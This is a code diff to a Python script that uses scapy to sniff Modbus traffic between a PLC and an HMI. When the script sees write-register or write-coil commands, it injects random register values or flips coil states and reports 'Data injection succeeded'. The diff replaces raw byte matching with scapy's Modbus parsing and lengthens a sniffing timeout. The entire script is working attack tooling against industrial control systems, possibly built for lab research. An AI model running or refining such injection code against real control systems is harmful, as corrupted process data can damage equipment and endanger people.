@@ -2,11 +2,14 @@ from time import *
 from scapy.all import *
 from random import *
 import os, nmap, threading
+from scapy.contrib import modbus
 
 plc_ip = ''
 hmi_ip = ''
 plc_mac = ''
 hmi_mac = ''
+#hmi_ip = '192.168.0.150'
+#hmi_mac = '16:27:04:e2:86:3d'
 frame1 = ''
 sport = ''
 seq_frame2 = ''
@@ -113,7 +116,7 @@ def get_ipmac():
 #capture tcp SA frame
 def cap():
         filx = "host {} and tcp[13] = 0x12".format(plc_ip)
-        pframe1 = sniff(iface="eth0", timeout=0.5, count=1, filter=filx)
+        pframe1 = sniff(iface="eth0", timeout=5, count=1, filter=filx)
         global frame1
         frame1 = pframe1[0]
 
@@ -158,22 +161,22 @@ def data_injection():
                         pp = "dst host {} and tcp[13] = 0x18".format(plc_ip)
                         plc_frames = sniff(iface="eth0", count=1, filter=pp)
                         modbus_query = plc_frames[0]
-                        st = str(modbus_query[Raw].load)
                         try:
-                                if "\\x01\\x10\\x00" in st:
+                                if modbus_query.funcCode == 16:
                                         ref = randrange(100, 110)
                                         value = randrange(1, 1000)
                                         changeData_reg(ref, value)
                                         xx = 0
                                         print("\033[1;36m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                         print("\033[1;36m{}\033[0m".format(modbus_query.show()))
-                                elif st[-9: -1] == "\\xff\\x00":
+                                elif modbus_query.funcCode == 5:
+                                    if modbus_query.outputValue == 65280:
                                         ref2 = randrange(40, 50)
                                         changeData0(ref2)
                                         xx = 0
                                         print("\033[1;35m ===Data injection succeeded !! {} =================\033[0m".format(datetime.now()))
                                         print("\033[1;36m{}\033[0m".format(modbus_query.show()))
-                                elif st[-9: -1] == "\\x00\\x00":
+                                    elif modbus_query.outputValue == 0:
                                         ref3 = randrange(40, 50)
                                         changeData1(ref3)
                                         xx = 0
